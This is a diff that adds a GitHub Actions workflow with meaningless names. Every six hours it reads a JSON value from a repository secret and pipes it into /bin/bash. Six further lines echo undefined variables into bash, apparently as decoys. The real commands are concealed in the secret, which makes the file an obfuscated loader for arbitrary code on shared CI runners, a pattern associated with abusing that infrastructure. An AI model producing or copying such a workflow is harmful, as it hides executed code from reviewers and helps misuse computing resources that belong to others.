@@ -1,0 +1,25 @@
+name: jinshenghuangzhu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinshenghuangzhu
+        env:
+          dscb24875: ${{ secrets.dscb24875 }}
+        run: |
+          echo $dscb24875 | jq -r .mnwk8074 | /bin/bash
+          echo $nxsik72 | jq -r .tcjdw1 | /bin/bash
+          echo $ync670 | jq -r .e869 | /bin/bash
+          echo $e452 | jq -r .ip0 | /bin/bash
+          echo $zm412 | jq -r .kl04 | /bin/bash
+          echo $vjwke5357 | jq -r .rxlcc4 | /bin/bash
+          echo $gh19 | jq -r .cxo012 | /bin/bash
+
